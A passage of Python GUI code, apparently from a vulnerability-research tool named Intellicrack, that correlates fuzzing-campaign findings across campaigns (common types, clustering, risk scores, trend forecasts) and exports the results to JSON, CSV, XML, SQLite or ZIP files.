            campaign_vulns = campaign.get("vulnerabilities", [])
            all_vulns.extend(campaign_vulns)
            vuln_by_campaign[i] = campaign_vulns

        results["summary"]["total_vulnerabilities"] = len(all_vulns)

        # Find common vulnerability types
        self._analyze_common_vulnerabilities(all_vulns, vuln_by_campaign, results)

        # Detect patterns
        self._detect_patterns(all_vulns, vuln_by_campaign, results)

        # Risk assessment
        self._assess_risk(all_vulns, results)

        # Calculate statistics
        self._calculate_statistics(all_vulns, vuln_by_campaign, results)

        return results

    def _analyze_common_vulnerabilities(
        self, all_vulns: list[dict], vuln_by_campaign: dict, results: dict
    ):
        """Analyze common vulnerabilities across campaigns."""
        from collections import Counter, defaultdict

        # Group by type
        type_groups = defaultdict(list)
        for vuln in all_vulns:
            vuln_type = vuln.get("type", "Unknown")
            type_groups[vuln_type].append(vuln)

        # Analyze each type
        common_vulns = {}
        for vuln_type, vulns in type_groups.items():
            # Count campaigns with this vulnerability type
            campaigns_with_type = set()
            for campaign_id, campaign_vulns in vuln_by_campaign.items():
                if any(v.get("type") == vuln_type for v in campaign_vulns):
                    campaigns_with_type.add(campaign_id)

            if len(campaigns_with_type) > 1:  # Found in multiple campaigns
                # Calculate average severity
                severities = [v.get("severity", "low") for v in vulns]
                severity_map = {"critical": 4, "high": 3, "medium": 2, "low": 1}
                avg_severity_num = sum(severity_map.get(s.lower(), 1) for s in severities) / len(
                    severities
                )
                avg_severity = {4: "critical", 3: "high", 2: "medium", 1: "low"}.get(
                    round(avg_severity_num),
                    "medium",
                )

                # Find common locations
                locations = [str(v.get("location", "Unknown")) for v in vulns]
                location_counts = Counter(locations)
                common_locations = [
                    loc for loc, count in location_counts.most_common(5) if count > 1
                ]

                common_vulns[vuln_type] = {
                    "campaign_count": len(campaigns_with_type),
                    "total_count": len(vulns),
                    "avg_severity": avg_severity,
                    "common_locations": common_locations,
                }

        results["common_vulnerabilities"] = common_vulns
        results["summary"]["common_types"] = len(common_vulns)

    def _detect_patterns(self, all_vulns: list[dict], vuln_by_campaign: dict, results: dict):
        """Detect vulnerability patterns."""
        patterns = []

        # Pattern 1: Sequential vulnerabilities
        for campaign_vulns in vuln_by_campaign.values():
            if len(campaign_vulns) > 3:
                # Check for vulnerabilities in close proximity
                positions = []
                for v in campaign_vulns:
                    if isinstance(v.get("position"), (int, float)):
                        positions.append(v.get("position"))

                if len(positions) > 3:
                    positions.sort()
                    # Check for clustering
                    clusters = []
                    current_cluster = [positions[0]]

                    for i in range(1, len(positions)):
                        if positions[i] - positions[i - 1] < 1000:  # Within 1KB
                            current_cluster.append(positions[i])
                        else:
                            if len(current_cluster) > 2:
                                clusters.append(current_cluster)
                            current_cluster = [positions[i]]

                    if len(current_cluster) > 2:
                        clusters.append(current_cluster)

                    if clusters:
                        patterns.append(
                            {
                                "type": "clustering",
                                "description": f"Vulnerabilities clustered in {len(clusters)} areas",
                                "confidence": min(95, len(clusters) * 30),
                                "affected_campaigns": 1,
                                "evidence": f"Found {len(clusters)} vulnerability clusters",
                            }
                        )

        # Pattern 2: Common attack vectors
        attack_vectors = defaultdict(int)
        for vuln in all_vulns:
            vuln_type = vuln.get("type", "").lower()
            if "buffer" in vuln_type or "overflow" in vuln_type:
                attack_vectors["memory_corruption"] += 1
            elif "injection" in vuln_type:
                attack_vectors["injection"] += 1
            elif "crypto" in vuln_type or "random" in vuln_type:
                attack_vectors["cryptographic"] += 1

        for vector, count in attack_vectors.items():
            if count > 5:
                patterns.append(
                    {
                        "type": "attack_vector",
                        "description": f"Prevalent {vector} attack vector",
                        "confidence": min(90, count * 10),
                        "affected_campaigns": len(vuln_by_campaign),
                        "evidence": f"{count} vulnerabilities of this type",
                    }
                )

        results["patterns"] = patterns

    def _assess_risk(self, all_vulns: list[dict], results: dict):
        """Assess overall risk based on vulnerabilities."""
        risk = {
            "overall_score": 0,
            "critical_count": 0,
            "systemic_count": 0,
            "recommendations": [],
        }

        # Count by severity
        severity_counts = defaultdict(int)
        for vuln in all_vulns:
            severity = vuln.get("severity", "low").lower()
            severity_counts[severity] += 1
            if severity == "critical":
                risk["critical_count"] += 1

        # Calculate risk score
        weights = {"critical": 10, "high": 5, "medium": 2, "low": 0.5}
        total_score = sum(weights.get(sev, 0) * count for sev, count in severity_counts.items())
        max_score = len(all_vulns) * 10  # If all were critical
        risk["overall_score"] = (total_score / max_score * 100) if max_score > 0 else 0

        # Identify systemic issues
        if len(results.get("common_vulnerabilities", {})) > 3:
            risk["systemic_count"] = len(results["common_vulnerabilities"])
            risk["recommendations"].append(
                "Multiple vulnerability types found across campaigns indicate systemic security issues.",
            )

        # Generate recommendations
        if risk["critical_count"] > 0:
            risk["recommendations"].append(
                f"Immediately address {risk['critical_count']} critical vulnerabilities.",
            )

        if risk["overall_score"] > 70:
            risk["recommendations"].append(
                "High risk score indicates significant security concerns. Comprehensive security review recommended.",
            )

        results["risk_assessment"] = risk

    def _calculate_statistics(self, all_vulns: list[dict], vuln_by_campaign: dict, results: dict):
        """Calculate correlation statistics."""
        stats = {
            "total_vulnerabilities": len(all_vulns),
            "unique_types": len(set(v.get("type", "Unknown") for v in all_vulns)),
            "campaigns_analyzed": len(vuln_by_campaign),
            "correlation_coefficient": 0.0,
        }

        # Calculate correlation coefficient (simplified)
        if len(vuln_by_campaign) > 1:
            # Check how many vulnerability types appear in multiple campaigns
            type_appearances = defaultdict(set)
            for campaign_id, vulns in vuln_by_campaign.items():
                for vuln in vulns:
                    vuln_type = vuln.get("type", "Unknown")
                    type_appearances[vuln_type].add(campaign_id)

            # Correlation based on shared vulnerability types
            shared_types = sum(1 for campaigns in type_appearances.values() if len(campaigns) > 1)
            total_types = len(type_appearances)

            if total_types > 0:
                stats["correlation_coefficient"] = shared_types / total_types

        results["statistics"] = stats

        # Update correlation strength
        if stats["correlation_coefficient"] > 0.7:
            results["summary"]["correlation_strength"] = "Strong"
        elif stats["correlation_coefficient"] > 0.4:
            results["summary"]["correlation_strength"] = "Moderate"
        elif stats["correlation_coefficient"] > 0.1:
            results["summary"]["correlation_strength"] = "Weak"
        else:
            results["summary"]["correlation_strength"] = "None"

    def _export_results(self):
        """Export results in various formats."""
        # Check if there are results to export
        if not self.campaign_results:
            QMessageBox.warning(self, "Warning", "No results available to export.")
            return

        # Create export dialog
        export_dialog = ExportResultsDialog(self.campaign_results, self)
        if export_dialog.exec() != QDialog.Accepted:
            return

        # Get export options
        export_format = export_dialog.format_combo.currentText()
        selected_campaigns = export_dialog.get_selected_campaigns()
        include_metadata = export_dialog.metadata_check.isChecked()
        include_raw_data = export_dialog.raw_data_check.isChecked()
        compress_output = export_dialog.compress_check.isChecked()

        if not selected_campaigns:
            QMessageBox.warning(self, "Warning", "No campaigns selected for export.")
            return

        try:
            # Perform export based on format
            if export_format == "JSON":
                output_path = self._export_to_json(
                    selected_campaigns, include_metadata, include_raw_data
                )
            elif export_format == "CSV":
                output_path = self._export_to_csv(selected_campaigns, include_metadata)
            elif export_format == "XML":
                output_path = self._export_to_xml(selected_campaigns, include_metadata)
            elif export_format == "SQLite":
                output_path = self._export_to_sqlite(selected_campaigns, include_metadata)
            elif export_format == "Archive (ZIP)":
                output_path = self._export_to_archive(
                    selected_campaigns, include_metadata, include_raw_data
                )
            else:
                QMessageBox.warning(self, "Warning", f"Unsupported export format: {export_format}")
                return

            # Compress if requested
            if compress_output and export_format != "Archive (ZIP)":
                output_path = self._compress_export(output_path)

            # Show success message
            reply = QMessageBox.question(
                self,
                "Export Complete",
                f"Results exported to:\n{output_path}\n\nOpen containing folder?",
                QMessageBox.Yes | QMessageBox.No,
            )

            if reply == QMessageBox.Yes:
                import os

                folder = os.path.dirname(output_path)
                if os.name == "nt":
                    os.startfile(folder)  # noqa: S606  # Legitimate folder opening for security research report access
                else:
                    import subprocess
                    open_path = shutil.which("open")
                    if open_path:
                        subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                            [open_path, folder], shell=False
                        )

        except Exception as e:
            logger.error(f"Export failed: {e}")
            QMessageBox.critical(self, "Error", f"Export failed: {e!s}")

    def _export_to_json(
        self, campaigns: dict[str, dict], include_metadata: bool, include_raw_data: bool
    ) -> str:
        """Export results to JSON format."""
        import json

        default_name = f"vulnerability_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        file_path, _ = QFileDialog.getSaveFileName(
            self,
            "Export to JSON",
            default_name,
            "JSON Files (*.json)",
        )

        if not file_path:
            raise ValueError("No file path selected")

        export_data = {
            "export_info": {
                "timestamp": datetime.now().isoformat(),
                "tool": "Intellicrack Vulnerability Research",
                "version": "1.0",
                "campaign_count": len(campaigns),
            },
            "campaigns": {},
        }

        for campaign_id, results in campaigns.items():
            campaign_export = {
                "campaign_id": campaign_id,
                "type": results.get("campaign_type", "Unknown"),
                "status": results.get("status", "Unknown"),
                "summary": {
                    "vulnerabilities": len(results.get("vulnerabilities", [])),
                    "crashes": results.get("crash_count", 0),
                    "coverage": results.get("coverage", {}).get("percentage", 0),
                },
            }

            if include_metadata:
                campaign_export["metadata"] = {
                    "created_at": results.get("created_at", 0),
                    "completed_at": results.get("completed_at", 0),
                    "duration": results.get("duration", 0),
                    "configuration": results.get("configuration", {}),
                }

            if include_raw_data:
                campaign_export["raw_data"] = results
            else:
                # Include essential data only
                campaign_export["vulnerabilities"] = results.get("vulnerabilities", [])
                campaign_export["statistics"] = results.get("statistics", {})

            export_data["campaigns"][campaign_id] = campaign_export

        # Write JSON file
        with open(file_path, "w", encoding="utf-8") as f:
            json.dump(export_data, f, indent=2, default=str)

        logger.info(f"Exported {len(campaigns)} campaigns to JSON: {file_path}")
        return file_path

    def _export_to_csv(self, campaigns: dict[str, dict], include_metadata: bool) -> str:
        """Export results to CSV format."""
        import csv

        default_name = f"vulnerability_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
        file_path, _ = QFileDialog.getSaveFileName(
            self,
            "Export to CSV",
            default_name,
            "CSV Files (*.csv)",
        )

        if not file_path:
            raise ValueError("No file path selected")

        # Prepare CSV data
        rows = []
        headers = [
            "Campaign ID",
            "Campaign Type",
            "Status",
            "Vulnerability Type",
            "Severity",
            "Location",
            "Exploitable",
            "Description",
        ]

        if include_metadata:
            headers.extend(["Created At", "Duration", "Test Cases"])

        for campaign_id, results in campaigns.items():
            base_row = [
                campaign_id[:8],
                results.get("campaign_type", "Unknown"),
                results.get("status", "Unknown"),
            ]

            # Add vulnerability rows
            for vuln in results.get("vulnerabilities", []):
                row = base_row + [
                    vuln.get("type", "Unknown"),
                    vuln.get("severity", "Unknown"),
                    str(vuln.get("location", "Unknown"))[:50],
                    str(vuln.get("exploitable", "Unknown")),
                    vuln.get("description", "")[:100],
                ]

                if include_metadata:
                    row.extend(
                        [
                            datetime.fromtimestamp(results.get("created_at", 0)).strftime(
                                "%Y-%m-%d %H:%M:%S"
                            ),
                            f"{results.get('duration', 0):.1f}s",
                            str(results.get("test_cases", 0)),
                        ]
                    )

                rows.append(row)

            # Add empty row if no vulnerabilities
            if not results.get("vulnerabilities"):
                row = base_row + ["None", "", "", "", "No vulnerabilities found"]
                if include_metadata:
                    row.extend(["", "", ""])
                rows.append(row)

        # Write CSV file
        with open(file_path, "w", newline="", encoding="utf-8") as f:
            writer = csv.writer(f)
            writer.writerow(headers)
            writer.writerows(rows)

        logger.info(f"Exported {len(campaigns)} campaigns to CSV: {file_path}")
        return file_path

    def _export_to_xml(self, campaigns: dict[str, dict], include_metadata: bool) -> str:
        """Export results to XML format."""
        import xml.etree.ElementTree as ET

        default_name = f"vulnerability_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.xml"
        file_path, _ = QFileDialog.getSaveFileName(
            self,
            "Export to XML",
            default_name,
            "XML Files (*.xml)",
        )

        if not file_path:
            raise ValueError("No file path selected")

        # Create XML structure
        root = ET.Element("VulnerabilityResults")
        root.set("timestamp", datetime.now().isoformat())
        root.set("tool", "Intellicrack")

        for campaign_id, results in campaigns.items():
            campaign_elem = ET.SubElement(root, "Campaign")
            campaign_elem.set("id", campaign_id)
            campaign_elem.set("type", results.get("campaign_type", "Unknown"))
            campaign_elem.set("status", results.get("status", "Unknown"))

            # Summary
            summary_elem = ET.SubElement(campaign_elem, "Summary")
            ET.SubElement(summary_elem, "Vulnerabilities").text = str(
                len(results.get("vulnerabilities", []))
            )
            ET.SubElement(summary_elem, "Crashes").text = str(results.get("crash_count", 0))
            ET.SubElement(
                summary_elem, "Coverage"
            ).text = f"{results.get('coverage', {}).get('percentage', 0):.1f}"

            # Metadata
            if include_metadata:
                metadata_elem = ET.SubElement(campaign_elem, "Metadata")
                ET.SubElement(metadata_elem, "CreatedAt").text = str(results.get("created_at", 0))
                ET.SubElement(metadata_elem, "Duration").text = str(results.get("duration", 0))
                ET.SubElement(metadata_elem, "TestCases").text = str(results.get("test_cases", 0))

            # Vulnerabilities
            vulns_elem = ET.SubElement(campaign_elem, "Vulnerabilities")
            for vuln in results.get("vulnerabilities", []):
                vuln_elem = ET.SubElement(vulns_elem, "Vulnerability")
                vuln_elem.set("type", vuln.get("type", "Unknown"))
                vuln_elem.set("severity", vuln.get("severity", "Unknown"))

                ET.SubElement(vuln_elem, "Location").text = str(vuln.get("location", "Unknown"))
                ET.SubElement(vuln_elem, "Exploitable").text = str(
                    vuln.get("exploitable", "Unknown")
                )
                ET.SubElement(vuln_elem, "Description").text = vuln.get("description", "")

        # Pretty print XML safely without using minidom
        # Use ET.indent if available (Python 3.9+), otherwise use manual formatting
        if hasattr(ET, 'indent'):
            ET.indent(root, space="  ")
        else:
            # Manual indentation for older Python versions
            def indent_tree(elem, level=0):
                i = "\n" + level * "  "
                if len(elem):
                    if not elem.text or not elem.text.strip():
                        elem.text = i + "  "
                    if not elem.tail or not elem.tail.strip():
                        elem.tail = i
                    for child in elem:
                        indent_tree(child, level + 1)
                    if not child.tail or not child.tail.strip():
                        child.tail = i
                else:
                    if level and (not elem.tail or not elem.tail.strip()):
                        elem.tail = i
            indent_tree(root)

        # Convert to string and write
        tree = ET.ElementTree(root)
        tree.write(file_path, encoding="utf-8", xml_declaration=True)

        logger.info(f"Exported {len(campaigns)} campaigns to XML: {file_path}")
        return file_path

    def _export_to_sqlite(self, campaigns: dict[str, dict], include_metadata: bool) -> str:
        """Export results to SQLite database."""
        from intellicrack.handlers.sqlite3_handler import sqlite3

        default_name = f"vulnerability_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.db"
        file_path, _ = QFileDialog.getSaveFileName(
            self,
            "Export to SQLite",
            default_name,
            "SQLite Database (*.db)",
        )

        if not file_path:
            raise ValueError("No file path selected")

        # Create database
        conn = sqlite3.connect(file_path)
        cursor = conn.cursor()

        # Create tables
        cursor.execute("""
            CREATE TABLE campaigns (
                campaign_id TEXT PRIMARY KEY,
                campaign_type TEXT,
                status TEXT,
                vulnerabilities_count INTEGER,
                crash_count INTEGER,
                coverage_percentage REAL,
                created_at INTEGER,
                duration REAL,
                test_cases INTEGER
            )
        """)

        cursor.execute("""
            CREATE TABLE vulnerabilities (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                campaign_id TEXT,
                type TEXT,
                severity TEXT,
                location TEXT,
                exploitable TEXT,
                description TEXT,
                FOREIGN KEY (campaign_id) REFERENCES campaigns (campaign_id)
            )
        """)

        # Insert data
        for campaign_id, results in campaigns.items():
            # Insert campaign
            cursor.execute(
                """
                INSERT INTO campaigns VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            """,
                (
                    campaign_id,
                    results.get("campaign_type", "Unknown"),
                    results.get("status", "Unknown"),
                    len(results.get("vulnerabilities", [])),
                    results.get("crash_count", 0),
                    results.get("coverage", {}).get("percentage", 0),
                    results.get("created_at", 0) if include_metadata else 0,
                    results.get("duration", 0) if include_metadata else 0,
                    results.get("test_cases", 0) if include_metadata else 0,
                ),
            )

            # Insert vulnerabilities
            for vuln in results.get("vulnerabilities", []):
                cursor.execute(
                    """
                    INSERT INTO vulnerabilities
                    (campaign_id, type, severity, location, exploitable, description)
                    VALUES (?, ?, ?, ?, ?, ?)
                """,
                    (
                        campaign_id,
                        vuln.get("type", "Unknown"),
                        vuln.get("severity", "Unknown"),
                        str(vuln.get("location", "Unknown"))[:255],
                        str(vuln.get("exploitable", "Unknown")),
                        vuln.get("description", "")[:500],
                    ),
                )

        # Create indexes
        cursor.execute("CREATE INDEX idx_campaign_type ON campaigns(campaign_type)")
        cursor.execute("CREATE INDEX idx_vuln_severity ON vulnerabilities(severity)")
        cursor.execute("CREATE INDEX idx_vuln_type ON vulnerabilities(type)")

        conn.commit()
        conn.close()

        logger.info(f"Exported {len(campaigns)} campaigns to SQLite: {file_path}")
        return file_path

    def _export_to_archive(
        self, campaigns: dict[str, dict], include_metadata: bool, include_raw_data: bool
    ) -> str:
        """Export results to ZIP archive with multiple formats."""
        import tempfile
        import zipfile

        default_name = f"vulnerability_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
        file_path, _ = QFileDialog.getSaveFileName(
            self,
            "Export to Archive",
            default_name,
            "ZIP Archive (*.zip)",
        )

        if not file_path:
            raise ValueError("No file path selected")

        # Create temporary directory
        with tempfile.TemporaryDirectory() as temp_dir:
            # Export to multiple formats
            json_path = os.path.join(temp_dir, "results.json")
            self._export_json_to_file(json_path, campaigns, include_metadata, include_raw_data)

            csv_path = os.path.join(temp_dir, "results.csv")
            self._export_csv_to_file(csv_path, campaigns, include_metadata)

            # Create summary report
            summary_path = os.path.join(temp_dir, "summary.txt")
            self._create_summary_report(summary_path, campaigns)

            # Add any crash files
            crashes_dir = os.path.join(temp_dir, "crashes")
            os.makedirs(crashes_dir, exist_ok=True)
            self._export_crash_files(crashes_dir, campaigns)

            # Create ZIP archive
            with zipfile.ZipFile(file_path, "w", zipfile.ZIP_DEFLATED) as zipf:
                for root, _dirs, files in os.walk(temp_dir):
                    for file in files:
                        file_path_in_zip = os.path.relpath(
                            os.path.join(root, file),
                            temp_dir,
                        )
                        zipf.write(os.path.join(root, file), file_path_in_zip)

        logger.info(f"Exported {len(campaigns)} campaigns to archive: {file_path}")
        return file_path

    def _compress_export(self, file_path: str) -> str:
        """Compress exported file."""
        import gzip
        import shutil

        compressed_path = file_path + ".gz"

        with open(file_path, "rb") as f_in:
            with gzip.open(compressed_path, "wb") as f_out:
                shutil.copyfileobj(f_in, f_out)

        # Remove original file
        os.remove(file_path)

        logger.info(f"Compressed export to: {compressed_path}")
        return compressed_path

    def _export_json_to_file(
        self, file_path: str, campaigns: dict, include_metadata: bool, include_raw_data: bool
    ):
        """Helper to export JSON to specific file."""
        import json

        export_data = {
            "campaigns": campaigns
            if include_raw_data
            else {
                cid: {
                    "summary": {
                        "type": r.get("campaign_type"),
                        "vulnerabilities": len(r.get("vulnerabilities", [])),
                        "crashes": r.get("crash_count", 0),
                    },
                    "vulnerabilities": r.get("vulnerabilities", [])[:50],
                }
                for cid, r in campaigns.items()
            },
        }

        if include_metadata:
            export_data["metadata"] = {
                "exported_at": datetime.now().isoformat(),
                "campaign_count": len(campaigns),
            }

        with open(file_path, "w") as f:
            json.dump(export_data, f, indent=2, default=str)

    def _export_csv_to_file(self, file_path: str, campaigns: dict, include_metadata: bool):
        """Helper to export CSV to specific file."""
        import csv

        with open(file_path, "w", newline="", encoding="utf-8") as f:
            writer = csv.writer(f)
            writer.writerow(["Campaign", "Type", "Vulnerabilities", "Severity Breakdown"])

            for cid, results in campaigns.items():
                vulns = results.get("vulnerabilities", [])
                severity_counts = {}
                for v in vulns:
                    sev = v.get("severity", "unknown").lower()
                    severity_counts[sev] = severity_counts.get(sev, 0) + 1

                severity_str = ", ".join(f"{k}:{v}" for k, v in severity_counts.items())

                writer.writerow(
                    [
                        cid[:8],
                        results.get("campaign_type", "Unknown"),
                        len(vulns),
                        severity_str,
                    ]
                )

    def _create_summary_report(self, file_path: str, campaigns: dict):
        """Create text summary report."""
        with open(file_path, "w") as f:
            f.write("Vulnerability Research Export Summary\n")
            f.write("=" * 50 + "\n\n")
            f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Campaigns: {len(campaigns)}\n\n")

            total_vulns = sum(len(r.get("vulnerabilities", [])) for r in campaigns.values())
            f.write(f"Total Vulnerabilities: {total_vulns}\n\n")

            for cid, results in campaigns.items():
                f.write(f"Campaign: {cid[:8]}\n")
                f.write(f"  Type: {results.get('campaign_type', 'Unknown')}\n")
                f.write(f"  Vulnerabilities: {len(results.get('vulnerabilities', []))}\n")
                f.write(f"  Crashes: {results.get('crash_count', 0)}\n")
                f.write("\n")

    def _export_crash_files(self, crashes_dir: str, campaigns: dict):
        """Export crash files if available."""
        for cid, results in campaigns.items():
            crashes = results.get("crashes", [])
            if crashes:
                campaign_crash_dir = os.path.join(crashes_dir, cid[:8])
                os.makedirs(campaign_crash_dir, exist_ok=True)

                for i, crash in enumerate(crashes[:10]):  # Limit to 10 crashes
                    crash_file = os.path.join(campaign_crash_dir, f"crash_{i:03d}.json")
                    import json

                    with open(crash_file, "w") as f:
                        json.dump(crash, f, indent=2, default=str)

    # Enhanced Correlation and Trend Analysis - Production-ready features

    def _advanced_pattern_correlation(self, campaigns):
        """Advanced pattern correlation using machine learning techniques."""
        patterns = {
            "vulnerability_sequences": [],
            "temporal_patterns": [],
            "severity_escalations": [],
            "attack_vectors": [],
            "correlation_matrix": None
        }

        try:
            # Extract vulnerability sequences across campaigns
            for campaign in campaigns:
                vulns = campaign.get("vulnerabilities", [])
                if len(vulns) > 1:
                    # Create sequence of vulnerability types
                    vuln_sequence = [v.get("type", "unknown") for v in vulns]
                    patterns["vulnerability_sequences"].append(vuln_sequence)

                    # Extract temporal patterns
                    timestamps = [v.get("timestamp", 0) for v in vulns]
                    if all(t > 0 for t in timestamps):
                        sorted_vulns = sorted(zip(timestamps, vuln_sequence, strict=False))
                        patterns["temporal_patterns"].append(sorted_vulns)

                    # Track severity escalations
                    severities = [self._severity_to_numeric(v.get("severity", "low")) for v in vulns]
                    if len(set(severities)) > 1:
                        patterns["severity_escalations"].append(severities)

            # Analyze common attack vector sequences
            attack_vector_sequences = []
            for campaign in campaigns:
                vectors = []
                for vuln in campaign.get("vulnerabilities", []):
                    vector = self._classify_attack_vector(vuln)
                    if vector:
                        vectors.append(vector)
                if len(vectors) > 1:
                    attack_vector_sequences.append(vectors)

            patterns["attack_vectors"] = attack_vector_sequences

            # Create correlation matrix
            if patterns["vulnerability_sequences"]:
                correlation_matrix = self._build_correlation_matrix(patterns["vulnerability_sequences"])
                patterns["correlation_matrix"] = correlation_matrix

            return patterns

        except Exception as e:
            logger.error(f"Advanced pattern correlation failed: {e}")
            return patterns

    def _build_correlation_matrix(self, sequences):
        """Build correlation matrix for vulnerability types."""
        import numpy as np

        # Get all unique vulnerability types
        all_types = set()
        for seq in sequences:
            all_types.update(seq)

        type_list = sorted(list(all_types))
        n_types = len(type_list)

        # Create co-occurrence matrix
        cooccurrence = np.zeros((n_types, n_types))
        type_to_idx = {t: i for i, t in enumerate(type_list)}

        for seq in sequences:
            # Count co-occurrences within the same campaign
            for i, type1 in enumerate(seq):
                for j, type2 in enumerate(seq):
                    if i != j:  # Don't count self-correlation
                        idx1, idx2 = type_to_idx[type1], type_to_idx[type2]
                        cooccurrence[idx1][idx2] += 1

        # Convert to correlation coefficients
        correlation_matrix = {}
        for i, type1 in enumerate(type_list):
            correlation_matrix[type1] = {}
            for j, type2 in enumerate(type_list):
                if i != j and cooccurrence[i][j] > 0:
                    # Simple correlation based on co-occurrence frequency
                    total_type1 = sum(cooccurrence[i])
                    correlation = cooccurrence[i][j] / total_type1 if total_type1 > 0 else 0
                    correlation_matrix[type1][type2] = round(correlation, 3)

        return correlation_matrix

    def _severity_to_numeric(self, severity):
        """Convert severity string to numeric value."""
        severity_map = {
            "low": 1, "medium": 2, "high": 3, "critical": 4
        }
        return severity_map.get(severity.lower(), 1)

    def _classify_attack_vector(self, vulnerability):
        """Classify vulnerability into attack vector categories."""
        vuln_type = vulnerability.get("type", "").lower()
        description = vulnerability.get("description", "").lower()

        if any(term in vuln_type or term in description for term in ["injection", "sql", "xss", "command"]):
            return "injection_based"
        elif any(term in vuln_type or term in description for term in ["buffer", "overflow", "memory"]):
            return "memory_corruption"
        elif any(term in vuln_type or term in description for term in ["auth", "permission", "access"]):
            return "access_control"
        elif any(term in vuln_type or term in description for term in ["crypto", "encryption", "key"]):
            return "cryptographic"
        elif any(term in vuln_type or term in description for term in ["race", "time", "toctou"]):
            return "timing_based"
        else:
            return "other"

    def _time_series_analysis(self, campaigns):
        """Perform time series analysis on vulnerability trends."""
        import datetime
        from collections import defaultdict

        import numpy as np

        analysis = {
            "trend_data": defaultdict(list),
            "seasonal_patterns": {},
            "anomalies": [],
            "forecasting": {}
        }

        try:
            # Extract temporal data
            for campaign in campaigns:
                campaign_date = campaign.get("timestamp")
                if campaign_date:
                    # Convert timestamp to datetime
                    if isinstance(campaign_date, (int, float)):
                        dt = datetime.datetime.fromtimestamp(campaign_date)
                    else:
                        dt = datetime.datetime.fromisoformat(str(campaign_date).replace('Z', '+00:00'))

                    # Group vulnerabilities by type and time
                    vulns_by_type = defaultdict(int)
                    for vuln in campaign.get("vulnerabilities", []):
                        vuln_type = vuln.get("type", "unknown")
                        vulns_by_type[vuln_type] += 1

                    # Store time series data
                    for vuln_type, count in vulns_by_type.items():
                        analysis["trend_data"][vuln_type].append({
                            "date": dt,
                            "count": count,
                            "campaign_id": campaign.get("id", "unknown")
                        })

            # Analyze trends for each vulnerability type
            for vuln_type, data_points in analysis["trend_data"].items():
                if len(data_points) >= 3:  # Need minimum data for analysis
                    # Sort by date
                    data_points.sort(key=lambda x: x["date"])

                    # Calculate trend direction
                    counts = [dp["count"] for dp in data_points]
                    trend = self._calculate_trend_direction(counts)

                    # Detect anomalies
                    anomalies = self._detect_anomalies(counts)
                    if anomalies:
                        for anomaly_idx in anomalies:
                            analysis["anomalies"].append({
                                "vuln_type": vuln_type,
                                "date": data_points[anomaly_idx]["date"],
                                "count": counts[anomaly_idx],
                                "expected_range": self._calculate_expected_range(counts, anomaly_idx)
                            })

                    # Store trend information
                    analysis["seasonal_patterns"][vuln_type] = {
                        "trend_direction": trend,
                        "volatility": np.std(counts) if len(counts) > 1 else 0,
                        "average_count": np.mean(counts),
                        "peak_periods": self._identify_peak_periods(data_points)
                    }

                    # Simple forecasting
                    forecast = self._simple_forecast(counts)
                    analysis["forecasting"][vuln_type] = forecast

            return analysis

        except Exception as e:
            logger.error(f"Time series analysis failed: {e}")
            return analysis

    def _calculate_trend_direction(self, values):
        """Calculate overall trend direction using linear regression."""
        if len(values) < 2:
            return "insufficient_data"

        try:
            import numpy as np
            x = np.arange(len(values))
            slope, _ = np.polyfit(x, values, 1)

            if slope > 0.1:
                return "increasing"
            elif slope < -0.1:
                return "decreasing"
            else:
                return "stable"
        except Exception:
            # Fallback to simple comparison
            if values[-1] > values[0]:
                return "increasing"
            elif values[-1] < values[0]:
                return "decreasing"
            else:
                return "stable"

    def _detect_anomalies(self, values):
        """Detect anomalous values using statistical methods."""
        if len(values) < 4:
            return []

        try:
            import numpy as np

            mean_val = np.mean(values)
            std_val = np.std(values)

            # Use 2-sigma rule for anomaly detection
            threshold = 2 * std_val
            anomalies = []

            for i, val in enumerate(values):
                if abs(val - mean_val) > threshold:
                    anomalies.append(i)

            return anomalies

        except Exception:
            return []

    def _calculate_expected_range(self, values, exclude_idx):
        """Calculate expected range excluding anomalous value."""
        try:
            import numpy as np

            filtered_values = [v for i, v in enumerate(values) if i != exclude_idx]
            if not filtered_values:
                return (0, 0)

            mean_val = np.mean(filtered_values)
            std_val = np.std(filtered_values)

            return (mean_val - std_val, mean_val + std_val)

        except Exception:
            return (0, 0)

    def _identify_peak_periods(self, data_points):
        """Identify periods with highest vulnerability counts."""
        if len(data_points) < 3:
            return []

        try:
            # Sort by count to find peaks
            sorted_points = sorted(data_points, key=lambda x: x["count"], reverse=True)
            top_count = len(data_points) // 3 or 1  # Top 1/3 or at least 1

            peaks = []
            for point in sorted_points[:top_count]:
                peaks.append({
                    "date": point["date"].strftime("%Y-%m-%d"),
                    "count": point["count"]
                })

            return peaks

        except Exception:
            return []

    def _simple_forecast(self, values):
        """Simple forecasting using moving average and trend."""
        if len(values) < 3:
            return {"method": "insufficient_data", "forecast": None}

        try:
            import numpy as np

            # Calculate trend
            recent_values = values[-3:]  # Last 3 values
            trend = (recent_values[-1] - recent_values[0]) / 2

            # Moving average
            moving_avg = np.mean(recent_values)

            # Simple forecast for next period
            forecast_value = moving_avg + trend

            return {
                "method": "moving_average_with_trend",
                "forecast": max(0, int(forecast_value)),  # Ensure non-negative
                "confidence": "low" if abs(trend) > np.std(values) else "medium",
                "trend_component": trend,
                "base_average": moving_avg
            }

        except Exception:
            return {"method": "error", "forecast": None}

    def _vulnerability_clustering(self, campaigns):
        """Cluster campaigns based on vulnerability patterns."""
        clustering_results = {
            "clusters": [],
            "cluster_characteristics": {},
            "silhouette_score": 0.0,
            "recommendations": []
        }

        try:
            # Extract feature vectors for each campaign
            feature_vectors = []
            campaign_metadata = []

            # Define vulnerability type categories
            vuln_categories = [
                "buffer_overflow", "injection", "crypto", "auth", "race_condition",
                "memory_corruption", "logic_flaw", "other"
            ]

            for campaign in campaigns:
                features = [0] * len(vuln_categories)
                vulns = campaign.get("vulnerabilities", [])

                # Count vulnerabilities by category
                for vuln in vulns:
                    category = self._categorize_vulnerability(vuln)
                    if category in vuln_categories:
                        idx = vuln_categories.index(category)
                        features[idx] += 1

                # Add additional features
                features.extend([
                    len(vulns),  # Total vulnerability count
                    sum(self._severity_to_numeric(v.get("severity", "low")) for v in vulns),  # Severity sum
